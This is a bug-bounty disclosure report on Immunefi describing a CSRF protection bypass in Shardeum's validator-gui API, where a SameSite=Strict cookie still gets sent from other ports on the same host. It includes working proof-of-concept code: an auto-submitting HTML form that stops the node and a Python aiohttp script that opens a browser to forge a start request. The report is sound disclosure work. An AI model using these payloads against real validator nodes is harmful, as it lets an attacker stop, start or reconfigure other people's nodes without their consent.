# Boost \_ Shardeum\_ Ancillaries 33040 - \[Websites and Applications - Low] API CSRF protection bypass l

Submitted on Tue Jul 09 2024 22:25:49 GMT-0400 (Atlantic Standard Time) by @anton\_quantish for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33040

Report type: Websites and Applications

Report severity: Low

Target: <https://github.com/shardeum/validator-gui/tree/dev>

Impacts:

* Taking down the application/website
* Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

Hey team,

## Brief/Intro

In certain circumstances, there's a possibility for attacker to bypass the CSRF protection of the Validator GUI's API server and, thus, execute arbitrary `operator-cli` commands even without user interaction at all.

## Vulnerability Details

The Validator GUI app uses requests to `/api` endpoint to communicate with the `operator-cli` application. Almost all the user do within the app result in sending requests there. Some of them are state-changing, like stopping or starting the node.

API authenticates requests by the `accessToken` cookie, which is `SameSite=Strict` that should, by your design, prevent [CSRF attacks](https://owasp.org/www-community/attacks/csrf).

And indeed, when you set `SameSite=Strict` flag for the cookie, it prevents browser from sending this cookie value from another *sites*. But the flaw of such a protection is that **Site IS NOT Origin**. The `origin` is the combination of scheme, full domain and port, but the `site` is just scheme + top level domain (see the screenshot attached).

Thus, the `SameSite=Strict` cookie will be sent by a browser, if the request is originated from the same host but different port, or from another subdomain.

In your case it means that if a victim opens in his browser any other web-server on the machine where the validator-gui works, this server can forge the `/api` requests and, thus, execute arbitrary `operator-cli` commands from behalf of the victim. This web-server can be malicious by itself, or store some third-party malicious content or just have their own vulnerabilities (like XSS).

Moreover, if the operator-cli and the validator-gui are installed on a victim's local machine (I believe, it's possible case), then every executable file or software on the same machine can force opening a browser window referring to its own web-server and forge the requests.

## Impact Details

For now, I see the following state-changing `/api` endpoints available:

* /node/start
* /node/stop
* /node/update
* /node/status/history
* /settings

Requests to all of them can be forged in the circumstances I described above. I see that some of gui functionality is still under development so the attack scope could be even wider in future (including staking or something similar, for instance).

## Severity

In some cases, as I shown you above, the malicious software is able to perform state-changing actions without interacting with a victim at all (PoC #2). Also, if the staking functionality is planning to be added into the validator-gui, this vulnerability could also lead to something similar to `Submitting malicious transactions` which is also Critical.

## Proof of concept

If your validator gui port is not 8081, please change it accordingly.

## Proof of Concept #1

1. Place the following HTML in the `/var/www/html/index.html` of Nginx installed on the same machine as the validator-gui, replacing the IP with the correct (external) one:

```
<form id=attack method=post action="http://{IP}:8081/api/node/stop">
</form>
<script>
attack.submit()
</script>
```

2. Visit `http://{IP}/index.hml` and make sure the malicious `/api` request with auth cookie inside was send to the validator-gui API and the node is stopping.

## Proof of Concept #2

In case when the validator-gui is installed on your local machine and is available in your browser on `http://localhost:8081`.

1. Install the dependencies with `pip3 install aiohttp`
2. Run the following python-script with `python3 poc.py`:

```
import asyncio
import webbrowser

from aiohttp import web


async def hello(request):
    return web.Response(text="""
<form id=attack method=post action="http://localhost:8081/api/node/start">
</form>
<script>
attack.submit()
</script>
""", content_type='text/html')


app = web.Application()
app.add_routes([web.get('/', hello)])

async def main():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, 'localhost', 12345)
    await site.start()
    webbrowser.open_new('http://localhost:12345/')
    while True:
        await asyncio.sleep(10)


asyncio.run(main())
```

2. Make sure the new browser window referring to `http://localhost:12345/` is open, and the malicious request with cookie inside is sent.

This script starts its own web-server on `localhost:12345` and, thus, opening the browser window referring to itself, can bypass the CSRF protection implemented.

This is how any software on the same machine can manage the `operator-cli`.
